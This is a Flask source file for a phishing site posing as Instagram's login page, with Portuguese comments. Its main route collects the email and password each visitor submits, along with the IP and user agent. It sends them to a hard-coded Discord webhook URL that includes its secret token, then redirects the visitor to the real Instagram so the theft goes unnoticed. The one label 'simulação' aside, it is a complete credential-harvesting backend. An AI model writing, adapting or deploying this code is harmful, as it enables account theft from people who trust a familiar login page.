from flask import Flask, request, render_template, redirect, send_from_directory
import requests
import os

app = Flask(__name__, static_folder="static", template_folder="templates")

# Webhook ativo do Discord
WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"

# Rota para servir imagens corretamente
@app.route('/img/<path:filename>')
def serve_img(filename):
    return send_from_directory('img', filename)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")

        # Enviar para webhook do Discord
        data = {
            "username": "Instagram Clone Logger",
            "embeds": [
                {
                    "title": "Credenciais capturadas (simulação)",
                    "color": 0x00FFFF,
                    "fields": [
                        {"name": "Email/Login", "value": email, "inline": True},
                        {"name": "Senha", "value": password, "inline": True},
                        {"name": "IP", "value": ip, "inline": False},
                        {"name": "User-Agent", "value": user_agent, "inline": False}
                    ]
                }
            ]
        }

        try:
            requests.post(WEBHOOK, json=data)
            print("[+] Credenciais enviadas para Discord.")
        except Exception as e:
            print("[!] Erro ao enviar para o Discord:", e)

        return redirect("https://www.instagram.com")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
